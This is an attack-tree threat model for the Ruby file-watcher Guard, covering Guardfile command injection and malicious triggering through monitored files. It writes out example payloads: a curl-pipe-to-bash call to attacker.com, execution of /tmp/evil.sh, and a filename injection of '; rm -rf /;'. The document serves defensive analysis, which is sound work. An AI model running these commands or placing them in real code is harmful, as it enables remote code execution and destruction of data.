## Attack Tree Path: [Exploit Guardfile Misconfiguration for Command Injection CRITICAL NODE](./attack_tree_paths/exploit_guardfile_misconfiguration_for_command_injection_critical_node.md)

* AND
    * **CRITICAL NODE** Gain Write Access to Guardfile **CRITICAL NODE**
        * Compromise Developer/Administrator Account **CRITICAL NODE**
    * **CRITICAL NODE** Inject Malicious Command into Guardfile Action **CRITICAL NODE**
        * **HIGH-RISK** Direct Shell Command Execution **CRITICAL NODE**
        * **HIGH-RISK** Execution of Malicious Script **CRITICAL NODE**
        * Overwrite Critical Application Files (leading to RCE) **CRITICAL NODE**

**Detailed Breakdown of Attack Vectors for High-Risk Paths and Critical Nodes:**

* **HIGH-RISK PATH: Exploit Guardfile Misconfiguration for Command Injection CRITICAL NODE:**
    * This path exploits weaknesses in how the `Guardfile` is managed and how actions are defined.
    * **Attack Vectors:**
        * Gaining unauthorized write access to the `Guardfile`.
        * Injecting malicious commands into the actions triggered by file system events.

* **CRITICAL NODE: Gain Write Access to Guardfile CRITICAL NODE:**
    * This node represents a critical point of control. If an attacker can modify the `Guardfile`, they can directly influence Guard's behavior.
    * **Attack Vectors:**
        * **Compromise Developer/Administrator Account CRITICAL NODE:** Gaining access to an account with permissions to modify the `Guardfile` through phishing, credential stuffing, or exploiting other vulnerabilities.
        * Exploiting vulnerabilities in the application itself that allow for arbitrary file writing, enabling modification of the `Guardfile`.

* **CRITICAL NODE: Inject Malicious Command into Guardfile Action CRITICAL NODE:**
    * Once write access is gained, the attacker modifies the `Guardfile` to execute malicious commands.
    * **Attack Vectors:**
        * **HIGH-RISK Direct Shell Command Execution CRITICAL NODE:** Directly inserting commands like `system("curl attacker.com/evil.sh | bash")` into the `Guardfile` actions.
        * **HIGH-RISK Execution of Malicious Script CRITICAL NODE:** Modifying actions to execute a pre-uploaded malicious script on the server (e.g., `system("/tmp/evil.sh")`).
        * **Overwrite Critical Application Files (leading to RCE) CRITICAL NODE:**  Changing actions to overwrite application code or configuration files with malicious content, which will be executed later by the application.

## Attack Tree Path: [Manipulate Monitored Files to Trigger Malicious Actions](./attack_tree_paths/manipulate_monitored_files_to_trigger_malicious_actions.md)

* AND
    * **CRITICAL NODE** Create/Modify Files to Trigger Unintended Command Execution **CRITICAL NODE**
        * **HIGH-RISK** Exploit Unsanitized Input in Executed Command **CRITICAL NODE**
            * **HIGH-RISK** Filename Contains Malicious Code **CRITICAL NODE**
        * **HIGH-RISK** Trigger Execution of Malicious Scripts **CRITICAL NODE**
            * Create a file triggering a pre-placed script **CRITICAL NODE**
        * Overwrite Configuration Files with Malicious Content **CRITICAL NODE**

**Detailed Breakdown of Attack Vectors for High-Risk Paths and Critical Nodes:**

* **HIGH-RISK PATH: Manipulate Monitored Files to Trigger Malicious Actions:**
    * This path focuses on exploiting how Guard reacts to changes in the monitored file system.
    * **Attack Vectors:**
        * Understanding the file paths and patterns that Guard is configured to monitor.
        * Creating or modifying files in these locations to trigger unintended command execution.

* **CRITICAL NODE: Create/Modify Files to Trigger Unintended Command Execution CRITICAL NODE:**
    * The attacker crafts specific file changes to force Guard to execute malicious commands.
    * **Attack Vectors:**
        * **HIGH-RISK Exploit Unsanitized Input in Executed Command CRITICAL NODE:** If Guard uses file names or content in commands without proper sanitization, attackers can inject malicious code through filenames.
            * **HIGH-RISK Filename Contains Malicious Code CRITICAL NODE:** Creating files with names like `; rm -rf /;` if the filename is used directly in a shell command.
        * **HIGH-RISK Trigger Execution of Malicious Scripts CRITICAL NODE:** Creating or modifying a file that triggers a Guard action to execute a pre-placed malicious script.
            * Creating a file that, when changed, causes Guard to execute a script the attacker has previously uploaded.
        * **Overwrite Configuration Files with Malicious Content CRITICAL NODE:** Manipulating files to trigger Guard actions that write malicious content to application configuration files.
